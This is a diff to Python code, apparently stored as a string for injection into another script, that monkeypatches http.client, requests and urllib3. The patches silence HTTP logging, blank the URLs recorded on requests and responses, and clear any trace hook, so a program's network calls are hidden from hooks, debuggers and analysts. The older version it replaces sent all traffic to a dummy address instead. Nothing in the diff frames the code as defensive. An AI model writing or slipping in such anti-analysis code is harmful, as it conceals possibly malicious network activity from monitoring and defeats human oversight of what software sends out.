@@ -46,7 +46,7 @@ def __anti_hook_url__():
 __anti_hook_url__()
 
 def hide_url_requests():
-    import sys, logging, re
+    import sys, logging
     try:
         import requests
         from requests.adapters import HTTPAdapter
@@ -68,71 +68,54 @@ def hide_url_requests():
     except Exception:
         pass
     try:
-        logging.getLogger("urllib3").setLevel(logging.CRITICAL)
-        logging.getLogger("requests").setLevel(logging.CRITICAL)
-        logging.getLogger("urllib3.connectionpool").disabled = True
-        sys.settrace(None)
-        
+        import http.client
+        http.client.HTTPConnection.debuglevel = 0
+        http.client.HTTPSConnection.debuglevel = 0
+
+        _real_send = http.client.HTTPConnection.send
+        def silent_send(self, data):
+            return _real_send(self, data)
+        http.client.HTTPConnection.send = silent_send
+    except:
+        pass
+    logging.getLogger("urllib3").setLevel(logging.CRITICAL)
+    logging.getLogger("requests").setLevel(logging.CRITICAL)
+    logging.getLogger("urllib3.connectionpool").disabled = True
+    try:
         import requests
         from requests.adapters import HTTPAdapter
         from requests.models import PreparedRequest
+        _orig_send = HTTPAdapter.send
+        def safe_send(self, request, **kwargs):
+            resp = _orig_send(self, request, **kwargs)
+
+            resp.url = ""
+            if hasattr(resp, "request") and resp.request:
+                resp.request.url = ""
+
+            return resp
+        HTTPAdapter.send = safe_send
+        _orig_prepare = PreparedRequest.prepare
+        def safe_prepare(self, *args, **kwargs):
+            _orig_prepare(self, *args, **kwargs)
+            self._real_url = self.url
+            return self
+        PreparedRequest.prepare = safe_prepare
+
+    except:
+        pass
+    try:
         import urllib3
-        original_prepare = PreparedRequest.prepare
-        
-        def hidden_prepare(self, *args, **kwargs):
-            result = original_prepare(self, *args, **kwargs)
-            self.url = "http://0.0.0.0/hidden"
+        _orig_urlopen = urllib3.connectionpool.HTTPConnectionPool.urlopen
 
-            if hasattr(self, 'headers'):
-                headers_to_keep = {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                    'Accept': '*/*',
-                    'Accept-Encoding': 'gzip, deflate',
-                    'Connection': 'keep-alive'
-                }
+        def safe_urlopen(self, method, url, *args, **kwargs):
+            return _orig_urlopen(self, method, url, *args, **kwargs)
 
-                self.headers.clear()
-                self.headers.update(headers_to_keep)
-            self.method = 'POST'
-            if hasattr(self, 'body') and self.body:
-                self.body = b''
-            
-            return result
-        
-        PreparedRequest.prepare = hidden_prepare
-        original_send = HTTPAdapter.send
-        
-        def hidden_send(self, request, **kwargs):
-            request.url = "http://0.0.0.0/hidden"
+        urllib3.connectionpool.HTTPConnectionPool.urlopen = safe_urlopen
+    except:
+        pass
+    sys.settrace(None)
 
-            if 'Host' in request.headers:
-                request.headers['Host'] = '0.0.0.0'
-
-            try:
-                response = original_send(self, request, **kwargs)
-            except Exception:
-                response = requests.Response()
-                response.status_code = 200
-                response._content = b''
-            response.url = ""
-            if hasattr(response, 'request') and response.request:
-                response.request.url = ""
-                response.request.method = "POST"
-            return response
-        HTTPAdapter.send = hidden_send
-
-        try:
-            original_urlopen = urllib3.connectionpool.HTTPConnectionPool.urlopen
-            def hidden_urlopen(self, method, url, *args, **kwargs):
-                url = "http://0.0.0.0/hidden"
-                if 'headers' in kwargs:
-                    kwargs['headers'] = {}
-                return original_urlopen(self, 'POST', url, *args, **kwargs)
-            urllib3.connectionpool.HTTPConnectionPool.urlopen = hidden_urlopen
-        except:
-            pass
-    except Exception as e:
-        print()
 hide_url_requests()
 """
 
